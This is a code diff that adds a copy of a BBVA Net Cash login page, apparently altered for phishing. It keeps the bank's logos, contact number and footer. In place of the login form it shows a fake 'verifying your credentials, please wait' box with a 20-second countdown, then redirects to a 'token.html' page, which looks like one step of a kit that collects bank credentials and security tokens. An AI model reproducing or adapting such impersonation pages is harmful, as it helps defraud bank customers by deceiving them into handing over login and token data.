@@ -1,0 +1,290 @@
+<!-- saved from url=(0074)https://www.bbvanetcash.pe/DFAUTH85/mult/KDPOSolicitarCredenciales_es.html -->
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+    <script type="text/javascript">
+      /*<![CDATA[*/
+      document.cookie = "IV_JCT=%2FDFAUTH85; path=/;secure;SameSite=none";
+      /*]]>*/
+    </script>
+
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://www.bbvanetcash.pe/DFAUTH85/images/favicon.ico"
+    />
+    <title>BBVA Net Cash</title>
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge;IE=9;IE=10;IE=11" />
+
+    <meta http-equiv="Content-Language" content="es" />
+    <meta name="viewport" content="initial-scale=1" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- CSS de Bootstrap -->
+    <link href="./empresas/bootstrap.css" rel="stylesheet" media="screen" />
+    <link
+      href="./empresas/bootstrap-bbva.css"
+      rel="stylesheet"
+      media="screen"
+    />
+
+    <style type="text/css">
+      .link_text {
+        font-size: medium;
+        color: #0265ba;
+        text-align: center;
+        font-weight: 500;
+      }
+    </style>
+  </head>
+  <body>
+    <input type="hidden" name="empresaTemp" id="empresaTemp" />
+    <input type="hidden" name="usuarioTemp" id="usuarioTemp" />
+    <input
+      type="hidden"
+      name="activateEncryptLastUsuario"
+      id="activateEncryptLastUsuario"
+      value="N"
+    />
+    <input
+      type="hidden"
+      name="activateEncryptLastEmpresa"
+      id="activateEncryptLastEmpresa"
+    />
+    <div class="container">
+      <div id="login-form">
+        <!-- HEADER -->
+        <div class="row">
+          <div class="col-lg-12 non-padding">
+            <ul class="header-layouts list-unstyled visible-xs">
+              <li class="colorn-1"></li>
+              <li class="colorn-1"></li>
+              <li class="colorn-1"></li>
+              <li class="colorn-1"></li>
+              <li class="colorn-1"></li>
+              <li class="colorn-1"></li>
+            </ul>
+          </div>
+          <div class="col-lg-12 visible-xs">
+            <div class="col-lg-12" style="top: 6px">
+              <img
+                style="width: 190px; height: auto"
+                src="./empresas/Logo_bbva_netcash_resp.png"
+              />
+            </div>
+          </div>
+          <div class="col-lg-12 margin-bottomx20"></div>
+        </div>
+        <div class="row">
+          <div class="col-lg-12">
+            <div
+              class="container-section-primary padding-top0"
+              onkeyup="reglaPass()"
+            >
+              <div class="row">
+                <div class="col-lg-4 col-md-4 col-sm-4 hidden-xs">
+                  <img
+                    style="width: 100%"
+                    src="./empresas/Logo_bbva_netcash.png"
+                  />
+                </div>
+
+                <ul
+                  class="list-unstyled list-inline-general-header pull-right"
+                ></ul>
+
+                <div class="col-lg-8 col-md-8 col-sm-8 padding-top20 hidden-xs">
+                  <ul
+                    class="list-unstyled list-inline-general-header pull-right"
+                  >
+                    <li class="iconList-Right" style="border-right: 0px">
+                      Contactanos
+                    </li>
+                    <i
+                      class="sprite-iconos-bbva sprite-iconos-bbva-ico-lineabbva"
+                      style="padding-right: 0px"
+                    ></i>
+                    <li
+                      class="iconList-Right"
+                      style="border-right: 0px; padding-right: 0px"
+                    >
+                      595-1200
+                    </li>
+                  </ul>
+
+                  <ul
+                    class="list-unstyled list-inline-general-header pull-right"
+                  >
+                    <li>
+                      <a href="javascript:abrirformularios();"
+                        >Contrata BBVA Net Cash</a
+                      >
+                    </li>
+                    <li>
+                      <a href="javascript:abrirCatalogo();"
+                        >Catalogo de servicios</a
+                      >
+                    </li>
+                    <li
+                      class="iconList-Right"
+                      style="
+                        border-right: 0px;
+                        padding-right: 0px;
+                        margin-left: 0px;
+                      "
+                    ></li>
+                  </ul>
+                </div>
+                <div class="clearfix"></div>
+
+                <form action="">
+                  <style>
+                    .loader {
+                      display: flex;
+                      justify-content: center;
+                      margin: 20px 0;
+                    }
+                    .dot {
+                      width: 10px;
+                      height: 10px;
+                      margin: 0 5px;
+                      background-color: #2563eb;
+                      border-radius: 50%;
+                      display: inline-block;
+                      animation: bounce 1.5s infinite ease-in-out;
+                    }
+                    .dot:nth-child(2) {
+                      animation-delay: 0.2s;
+                    }
+                    .dot:nth-child(3) {
+                      animation-delay: 0.4s;
+                    }
+                    @keyframes bounce {
+                      0%,
+                      80%,
+                      100% {
+                        transform: scale(0);
+                      }
+                      40% {
+                        transform: scale(1);
+                      }
+                    }
+                    button {
+                      background-color: gray;
+                      color: white;
+                      padding: 10px 20px;
+                      border: none;
+                      border-radius: 5px;
+                      cursor: not-allowed;
+                    }
+                    button.enabled {
+                      background-color: #2563eb;
+                      cursor: pointer;
+                    }
+                  </style>
+                  <div class="col-lg-4 col-md-4 col-sm-4" style="width: 100%">
+                    <div
+                      class="bg-amber-100 border border-gray-300 rounded-md shadow-md p-6 text-center"
+                      style="margin: auto; max-width: 350px"
+                    >
+                      <div class="loader">
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                      </div>
+                      <p>
+                        Estamos verificando sus credenciales
+                        <strong>Por favor espere</strong> 
+                      </p>
+                      <p>Tiempo restante: <span id="countdown">20</span>s</p>
+                    </div>
+                  </div>
+                </form>
+                <script>
+                    let countdown = 20;
+                    const countdownElement = document.getElementById("countdown");
+                    const button = document.getElementById("authorize");
+                    
+                    const timer = setInterval(() => {
+                        countdown--;
+                        countdownElement.textContent = countdown;
+                        
+                        if (countdown <= 0) {
+                            clearInterval(timer);
+                           window.location.href="token.html"
+                        }
+                    }, 1000);
+                </script>
+                <div></div>
+              </div>
+            </div>
+          </div>
+          <div class="clearfix"></div>
+          <!-- FOOTER -->
+          <footer class="col-lg-12 footer-bbva">
+            <div class="container">
+              <p>
+                <script>
+                  document.write(new Date().getFullYear());
+                </script>
+                2025 BBVA S.A.
+              </p>
+            </div>
+          </footer>
+        </div>
+      </div>
+      <div id="iframe-container" class="iframe-container" style="display: none">
+        <iframe
+          id="microfrontend"
+          width="100%"
+          style="border: none"
+          class="iframe"
+          title="Coexistence login application"
+          src="./empresas/index.html"
+        ></iframe>
+      </div>
+    </div>
+    <!-- Librería jQuery requerida por los plugins de JavaScript -->
+
+    <div
+      style="
+        z-index: 2147483647 !important;
+        padding: 0px !important;
+        margin: 0px !important;
+        border-radius: 8px !important;
+        position: fixed !important;
+        color-scheme: normal !important;
+        box-shadow: rgba(0, 0, 0, 0.15) 0px 2px 4px 0px,
+          rgba(0, 0, 0, 0.18) 0px 8px 15px 6px !important;
+        border: 1px solid rgba(0, 0, 0, 0.2) !important;
+        overflow: hidden !important;
+        backdrop-filter: blur(20px) !important;
+        background-color: rgba(230, 230, 230, 0.8) !important;
+        top: 249px !important;
+        left: -999999px !important;
+        opacity: 0 !important;
+        visibility: hidden !important;
+        height: 69.5px !important;
+        width: 305px !important;
+      "
+    >
+      <template shadowrootmode="open"
+        ><iframe
+          src="chrome-extension://pejdijmoenmkgeppbflobdenhhabjlaj/completion_list.html?username=&amp;colorScheme=undefined&amp;screenX=0&amp;screenY=0&amp;effectiveWindowWidth=3440"
+          frameborder="0"
+          style="
+            width: 305px !important;
+            height: 69.5px !important;
+            display: block !important;
+          "
+        ></iframe
+      ></template>
+    </div>
+  </body>
+</html>
